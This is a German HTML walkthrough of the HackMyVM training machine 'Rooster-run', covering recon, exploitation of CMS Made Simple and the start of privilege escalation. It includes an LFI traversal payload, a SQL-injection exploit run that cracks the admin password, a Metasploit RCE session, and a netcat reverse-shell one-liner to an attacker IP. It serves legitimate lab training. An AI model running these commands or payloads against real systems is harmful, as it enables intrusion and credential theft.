@@ -1,0 +1,992 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rooster-run - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header angepasst -->
+    <div class="header-bg">
+        <h1>Rooster-run - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe Rot wird durch CSS gesteuert -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmente für Rot -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">rm</div>
+                <div class="tool-item">mkfifo</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nc (Netcat)</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">getfacl</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">watch</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">run-parts</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis gemäß Struktur -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung des Ziels im lokalen Netzwerk mittels `arp-scan -l`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Gerät mit der IP `192.168.2.111` und der MAC `08:00:27:5e:09:7c` (PCS Systemtechnik GmbH / Oracle VirtualBox) wird gefunden. Dies ist unser Zielsystem "Rooster-run".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die IP-Adresse `192.168.2.111` notieren und als Ziel für weitere Scans verwenden.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring (z.B. `arpwatch`) implementieren und Netzwerksegmentierung zur Begrenzung der Scan-Reichweite in Betracht ziehen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.111	08:00:27:5e:09:7c	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei des Angreifer-Systems wird bearbeitet, um der Ziel-IP `192.168.2.111` den Hostnamen `rooster.hmv` zuzuweisen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies vereinfacht die Adressierung des Ziels in den nachfolgenden Schritten und verbessert die Lesbarkeit von Befehlen und URLs.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den definierten Hostnamen `rooster.hmv` für alle weiteren Aktionen verwenden.<br><strong>Empfehlung (Admin):</strong> Dies ist eine lokale Konfiguration auf dem Angreifer-System ohne direkte Auswirkung auf das Ziel. Eine zentrale DNS-Verwaltung ist generell vorzuziehen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+192.168.2.111   rooster.hmv
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sV -A -T5 -p-`) wird auf das Ziel `rooster.hmv` durchgeführt, um offene Ports, Dienste, Versionen und das Betriebssystem zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nmap identifiziert zwei offene TCP-Ports:
+                *   **22/tcp (SSH):** OpenSSH 9.2p1 (Debian).
+                *   **80/tcp (HTTP):** Apache httpd 2.4.57 (Debian).
+            Der HTTP-Server liefert den Titel "Home - Blog" und einen Generator-Tag, der auf "CMS Made Simple" hinweist. Die OS-Erkennung deutet auf Linux hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Hauptangriffsvektoren sind SSH und der Webserver. Die Identifizierung von "CMS Made Simple" ist entscheidend – recherchieren Sie bekannte Schwachstellen für dieses CMS.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen sind. Halten Sie SSH, Apache und insbesondere CMS Made Simple auf dem neuesten Stand und wenden Sie Sicherheitspatches an.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-30 21:33 CET
+Nmap scan report for rooster.hmv (192.168.2.111)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+| ssh-hostkey:
+|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
+|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-title: Home - Blog
+|_http-generator: CMS Made Simple - Copyright (C) 2004-2023. All rights reserved.
+|_http-server-header: Apache/2.4.57 (Debian)
+MAC Address: 08:00:27:5E:09:7C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms rooster.hmv (192.168.2.111)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.21 seconds
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der vorherige Nmap-Scan wird wiederholt, gefiltert mit `grep open`, um nur die offenen Ports anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports 22 (SSH) und 80 (HTTP).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nützliche Zusammenfassung der offenen Ports.<br><strong>Empfehlung (Admin):</strong> Keine neuen Informationen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p- | grep open</span></div>
+                    <pre>
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Webserver-Scanner `nikto` wird auf Port 80 des Ziels ausgeführt, um nach bekannten Web-Schwachstellen zu suchen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt Apache/2.4.57. Es meldet fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`) und ein Cookie (`CMSSESSIDa0ef49a94e6c`), das ohne das `HttpOnly`-Flag gesetzt wird. Es findet eine potenziell interessante Datei `/config.php`, einen Hinweis auf eine alte phpAuction-Schwachstelle (wahrscheinlich False Positive, da CMSMS läuft), ein browsbares `/doc/`-Verzeichnis, ein interessantes `/lib/`-Verzeichnis, ein indizierbares `/tmp/`-Verzeichnis und eine Admin-Login-Seite `/admin/login.php`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die wichtigsten Funde sind `/config.php` (Zugangsdaten?), das nicht gesetzte `HttpOnly`-Flag für das Session-Cookie (potenziell XSS-Ausnutzung), die browsable/indexed Verzeichnisse `/doc` und `/tmp` sowie die Admin-Login-Seite. Untersuchen Sie diese Punkte genauer.<br><strong>Empfehlung (Admin):</strong> Fügen Sie die fehlenden Sicherheitsheader hinzu. Setzen Sie das `HttpOnly`-Flag für Session-Cookies. Schränken Sie den Zugriff auf `/config.php` ein. Deaktivieren Sie Directory Indexing für `/doc` und `/tmp`. Sichern Sie die Admin-Login-Seite ab.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.111</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.111
++ Target Hostname:    192.168.2.111
++ Target Port:        80
++ Start Time:         2023-11-30 21:33:43 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.57 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: Cookie CMSSESSIDa0ef49a94e6c created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /config.php: PHP Config file may contain database IDs and passwords.
++ /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995
++ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678
++ /lib/: This might be interesting.
++ /tmp/: Directory indexing found.
++ /tmp/: This might be interesting.
++ /admin/login.php: Admin login page/section found.
++ 8108 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2023-11-30 21:34:35 (GMT1) (52 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird für eine Verzeichnis- und Dateisuche auf `http://rooster.hmv` eingesetzt, unter Verwendung einer Standard-Wortliste und vieler Dateiendungen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet die Hauptdatei `index.php` und mehrere Verzeichnisse (`/modules`, `/uploads`, `/doc`, `/admin`, `/assets`, `/lib`, `/tmp`), die typisch für CMS Made Simple sind. Es findet auch die `/config.php`, die aber mit Größe 0 angezeigt wird, was verdächtig ist (möglicherweise keine Leseberechtigung oder die Datei ist tatsächlich leer/ein Dummy).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erkunden Sie die gefundenen Verzeichnisse, insbesondere `/admin` und `/uploads`. Versuchen Sie, auf `/config.php` zuzugreifen und zu verstehen, warum sie als Größe 0 gemeldet wird.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Webserver-Verzeichnisse die korrekten Berechtigungen haben und sensible Dateien wie `config.php` nicht web-zugänglich sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://rooster.hmv  -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+http://rooster.hmv/index.php            (Status: 200) [Size: 19257]
+http://rooster.hmv/modules              (Status: 301) [Size: 312] [--> http://rooster.hmv/modules/]
+http://rooster.hmv/uploads              (Status: 301) [Size: 312] [--> http://rooster.hmv/uploads/]
+http://rooster.hmv/doc                  (Status: 301) [Size: 308] [--> http://rooster.hmv/doc/]
+http://rooster.hmv/admin                (Status: 301) [Size: 310] [--> http://rooster.hmv/admin/]
+http://rooster.hmv/assets               (Status: 301) [Size: 311] [--> http://rooster.hmv/assets/]
+http://rooster.hmv/lib                  (Status: 301) [Size: 308] [--> http://rooster.hmv/lib/]
+http://rooster.hmv/config.php           (Status: 200) [Size: 0]
+http://rooster.hmv/tmp                  (Status: 301) [Size: 308] [--> http://rooster.hmv/tmp/]
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `dirb` wird für eine rekursive Verzeichnissuche verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dirb bestätigt die von Gobuster und Nikto gefundenen Verzeichnisse (`/admin`, `/assets`, `/doc`, `/lib`, `/modules`, `/tmp`, `/uploads`). Es findet zusätzlich `robots.txt` und `index.html` im `/doc`-Verzeichnis und weitere Unterverzeichnisse in `/admin` und `/lib`. `/server-status` wird mit 403 (Forbidden) gemeldet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie den Inhalt von `/doc/robots.txt` auf interessante Ausschlüsse oder Hinweise. Erkunden Sie die Unterverzeichnisse von `/admin` und `/lib`.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `robots.txt` keine sensiblen Pfade preisgibt. Sichern Sie `/server-status` oder deaktivieren Sie es.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://rooster.hmv</span></div>
+                    <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: [Datum/Zeit nicht gezeigt]
+URL_BASE: http://rooster.hmv/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4619
+
+---- Scanning URL: http://rooster.hmv/ ----
+==> DIRECTORY: http://rooster.hmv/admin/
+==> DIRECTORY: http://rooster.hmv/assets/
+==> DIRECTORY: http://rooster.hmv/doc/
++ http://rooster.hmv/index.php (CODE:200|SIZE:19257)
+==> DIRECTORY: http://rooster.hmv/lib/
+==> DIRECTORY: http://rooster.hmv/modules/
++ http://rooster.hmv/server-status (CODE:403|SIZE:276)
+==> DIRECTORY: http://rooster.hmv/tmp/
+==> DIRECTORY: http://rooster.hmv/uploads/
+
+---- Entering directory: http://rooster.hmv/admin/ ----
++ http://rooster.hmv/admin/index.php (CODE:302|SIZE:0)
+==> DIRECTORY: http://rooster.hmv/admin/lang/
+==> DIRECTORY: http://rooster.hmv/admin/plugins/
+==> DIRECTORY: http://rooster.hmv/admin/templates/
+==> DIRECTORY: http://rooster.hmv/admin/themes/
+
+---- Entering directory: http://rooster.hmv/doc/ ----
++ http://rooster.hmv/doc/index.html (CODE:200|SIZE:24)
++ http://rooster.hmv/doc/robots.txt (CODE:200|SIZE:121)
+
+---- Entering directory: http://rooster.hmv/lib/ ----
+==> DIRECTORY: http://rooster.hmv/lib/assets/
+==> DIRECTORY: http://rooster.hmv/lib/classes/
++ http://rooster.hmv/lib/index.html (CODE:200|SIZE:24)
+==> DIRECTORY: http://rooster.hmv/lib/jquery/
+==> DIRECTORY: http://rooster.hmv/lib/lang/
+==> DIRECTORY: http://rooster.hmv/lib/phpmailer/
+==> DIRECTORY: http://rooster.hmv/lib/plugins/
+==> DIRECTORY: http://rooster.hmv/lib/smarty/
+==> DIRECTORY: http://rooster.hmv/lib/tasks/
+
+---- Entering directory: http://rooster.hmv/lib/smarty/ ----
+==> DIRECTORY: http://rooster.hmv/lib/smarty/plugins/
+
+[...] (Weitere Verzeichnisse wahrscheinlich)
+
+-----------------
+END_TIME: [Datum/Zeit nicht gezeigt]
+DOWNLOADED: [Anzahl] - FOUND: [Anzahl]
+                    </pre> <!-- Dirb-Ausgabe leicht gekürzt/formatiert -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Manuelle Untersuchung der gefundenen Dateien `robots.txt`, `/tmp/cache` (implizit besucht) und `README.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                *   `robots.txt`: Verbietet das Crawlen der meisten CMS-Verzeichnisse, erlaubt aber `/tmp/cache/`.
+                *   `/tmp/cache/`: Scheint nur das Session-Cookie zu enthalten.
+                *   `README.txt`: Enthält Standardinformationen zu CMS Made Simple, erwähnt verwendete Bibliotheken (Smarty, ADODB_lite) und verweist auf die offizielle Dokumentation.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die erlaubte `/tmp/cache`-Direktive in `robots.txt` könnte darauf hindeuten, dass dort interessante Daten zu finden sind (obwohl hier nur ein Cookie gesehen wurde). Die erwähnten Bibliotheken (Smarty, ADODB_lite) können spezifische Schwachstellen haben, die recherchiert werden sollten.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `robots.txt` korrekt konfiguriert ist und keine unbeabsichtigten Informationen preisgibt. Sichern Sie Cache-Verzeichnisse.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# Inhalt von http://rooster.hmv/doc/robots.txt
+User-agent: *
+
+Disallow: /assets/
+Disallow: /doc/
+Disallow: /lib/
+Disallow: /modules/
+Disallow: /tmp/
+
+Allow: /tmp/cache/
+
+
+# Beobachtung beim Besuch von http://rooster.hmv/tmp/cache/
+Cookie CMSSESSIDa0ef49a94e6c=6k3muj7lqldvtb68bj863mc84n
+
+
+# Inhalt von http://rooster.hmv/doc/README.txt
+CMS Made Simple http://www.cmsmadesimple.org
+
+For information on installation, see INSTALL.txt.
+For information on upgrading your installation from a previous version, see UPGRADE.txt.
+
+Official documentation website: https://docs.cmsmadesimple.org
+
+Notes
+---------------------------------
+The version of ADODB_lite used is modified for CMS Made Simple's needs.
+Copying over it with the latest version will result in some things not working correctly and it probably won't even install on all databases.
+
+Credits
+---------------------------------
+CMSMS uses the Smarty template engine in various places.
+Their license and various documentation files are located in the Smarty subdirectory of this distribution.
+Their website is located at: http://smarty.php.net
+
+CMSMS uses the adodb_lite database abstraction library.
+It is released under the LGPGL license and is located at: http://adodblite.sourceforge.net/index.php
+                    </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Local File Inclusion (LFI) Versuch wird durchgeführt, indem versucht wird, `/etc/passwd` über den `page`-Parameter der `index.php` zu laden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch scheint fehlzuschlagen (keine Ausgabe von `/etc/passwd` gezeigt). Das CMS ist wahrscheinlich nicht für diesen einfachen LFI-Typ anfällig.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie komplexere LFI-Payloads oder andere Parameter, falls vorhanden. Konzentrieren Sie sich auf andere Schwachstellen wie SQLi oder RCE.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie robuste Eingabevalidierung und Pfad-Normalisierung, um LFI-Angriffe zu verhindern.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# LFI Versuch (im Browser oder mit curl)
+http://rooster.hmv/index.php?page=/../../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+# (Keine Ausgabe von /etc/passwd)
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Hinweis auf einen Exploit für eine SQL-Injection-Schwachstelle in CMS Made Simple <= 2.2.9 (Exploit-DB 46635). Ein Python-Skript (`exploit.py`, vermutlich der Exploit von Exploit-DB) wird gegen das Ziel ausgeführt, um den Admin-Passwort-Hash zu extrahieren und mit `rockyou.txt` zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit ist erfolgreich! Er findet den Salt (`1a0112229fbd699d`), den Benutzernamen (`admin`), die E-Mail (`admin@localhost.com`), den Passwort-Hash (`4f94...`) und knackt diesen zum Klartextpasswort `<span class="password">homeandaway</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein kritischer Fund. Verwenden Sie die gefundenen Admin-Zugangsdaten (`admin`:`homeandaway`), um sich im CMSMS-Adminbereich (`/admin`) anzumelden. Suchen Sie nach Funktionen für Dateiuploads, Codeausführung oder anderen Möglichkeiten zur weiteren Kompromittierung.<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie CMS Made Simple dringend auf eine Version > 2.2.9, um diese SQLi-Schwachstelle zu schließen. Verwenden Sie starke, einzigartige Admin-Passwörter. Implementieren Sie eine Web Application Firewall (WAF).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
+exploit https://www.exploit-db.com/exploits/46635
+                     </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 exploit.py -u http://192.168.2.111/ --crack -w /usr/share/wordlists/rockyou.txt</span></div>
+                      <pre>
+[+] Salt for password found: 1a0112229fbd699d
+[+] Username found: admin
+[+] Email found: admin@localhost.com
+[+] Password found: 4f943036486b9ad48890b2efbf7735a8
+[+] Password cracked: <span class="password">homeandaway</span>
+                      </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine URL zum Admin-Bereich wird notiert, wahrscheinlich nach dem erfolgreichen Login oder bei der Interaktion mit dem Admin-Panel.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Struktur des Admin-Bereichs.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese URL, um auf das Admin-Panel zuzugreifen.<br><strong>Empfehlung (Admin):</strong> Standard-CMS-URL, muss gesichert sein.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+http://rooster.hmv/admin/?__c=1b58148ee6df596c0e3
+                      </pre>
+                   </div>
+               </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Metasploit (`msfconsole -q`) wird gestartet. Es wird nach einem Exploit für CVE-2019-9055 gesucht, der eine authentifizierte Remote Code Execution (RCE) in CMS Made Simple via Object Injection ermöglicht. Das Modul `exploit/multi/http/cmsms_object_injection_rce` wird geladen und konfiguriert (Ziel `rooster.hmv`, Port 80, Listener auf Angreifer-IP/Port 4444). Ein erster Versuch ohne Angabe von Zugangsdaten schlägt fehl. Danach werden der Benutzername (`admin`) und das zuvor gefundene Passwort (`homeandaway`) gesetzt, und der Exploit wird erneut ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Exploit ist erfolgreich! Nach Angabe der korrekten Admin-Zugangsdaten kann das Modul die Schwachstelle ausnutzen und eine Meterpreter-Sitzung zum Angreifer aufbauen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Initial Access als Webserver-Benutzer (`www-data`) wurde erreicht. Verwenden Sie die Meterpreter-Sitzung, um das System zu erkunden (`sysinfo`, `getuid`, `pwd`, `ls`), nach Konfigurationsdateien oder weiteren Zugangsdaten zu suchen und Privilegieneskalationsvektoren zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie CMS Made Simple dringend, um CVE-2019-9055 zu patchen. Implementieren Sie Sicherheitsmaßnahmen gegen Object Injection in PHP (z.B. sorgfältige Deserialisierung, Eingabevalidierung). Beschränken Sie die Rechte des Webserver-Benutzers (`www-data`).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">msfconsole -q</span></div>
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">search CVE-2019-9055</span></div>
+                     <pre>
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank    Check  Description
+   -  ----                                           ---------------  ----    -----  -----------
+   0  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal  Yes    CMS Made Simple Authenticated RCE via object injection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cmsms_object_injection_rce
+                     </pre>
+                      <div class="prompt metasploit-prompt">msf6 > <span class="command">use 0</span></div>
+                      <pre>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_object_injection_rce) > <span class="command">options</span></div>
+                      <pre>
+Module options (exploit/multi/http/cmsms_object_injection_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:p
+                                         ort][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
+                                         /docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base cmsms directory path
+   USERNAME                    yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.2.199    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+View the full module info with the info, or info -d command.
+                      </pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_object_injection_rce) > <span class="command">set rhosts rooster.hmv</span></div>
+                      <pre>rhosts => rooster.hmv</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_object_injection_rce) > <span class="command">set rport 80</span></div>
+                      <pre>rport => 80</pre>
+                      <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_object_injection_rce) > <span class="command">run</span></div>
+                      <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[-] Exploit aborted due to failure: no-access: Authentication was unsuccessful
+[*] Exploit completed, but no session was created.
+                      </pre>
+                       <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_object_injection_rce) > <span class="command">set password homeandaway</span></div>
+                       <pre>password => homeandaway</pre>
+                       <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_object_injection_rce) > <span class="command">run</span></div>
+                       <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[-] Exploit aborted due to failure: no-access: Authentication was unsuccessful
+[*] Exploit completed, but no session was created.
+                       </pre>
+                        <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_object_injection_rce) > <span class="command">set USERNAME admin</span></div>
+                        <pre>USERNAME => admin</pre>
+                        <div class="prompt metasploit-prompt">msf6 exploit(multi/http/cmsms_object_injection_rce) > <span class="command">run</span></div>
+                        <pre>
+[*] Started reverse TCP handler on 192.168.2.199:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable.
+[*] Sending stage (39927 bytes) to 192.168.2.111
+[+] Deleted FEoqWcVG.php
+[*] Meterpreter session 1 opened (192.168.2.199:4444 -> 192.168.2.111:46142) at 2023-12-01 00:04:04 +0100
+                        </pre>
+                         <div class="prompt meterpreter-prompt">meterpreter > <span class="command"></span></div>
+                  </div>
+              </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Standard-Reverse-Shell-Befehl mit `nc` und einer Named Pipe (`/tmp/f`) wird vorbereitet oder notiert. Er zielt auf Port 4445 des Angreifers.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl würde, wenn er auf dem Ziel ausgeführt wird (z.B. über die Meterpreter-Sitzung), eine einfache Shell-Verbindung zum Angreifer herstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kann als Alternative zur Meterpreter-Sitzung verwendet werden, falls diese instabil wird oder bestimmte Befehle nicht funktionieren.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Verwendung von `nc` und die Erstellung von Named Pipes in `/tmp`. Beschränken Sie ausgehende Verbindungen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Befehl für eine manuelle Reverse Shell (auszuführen auf dem Ziel)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 4445 >/tmp/f
+                     </pre>
+                  </div>
+              </div>
+
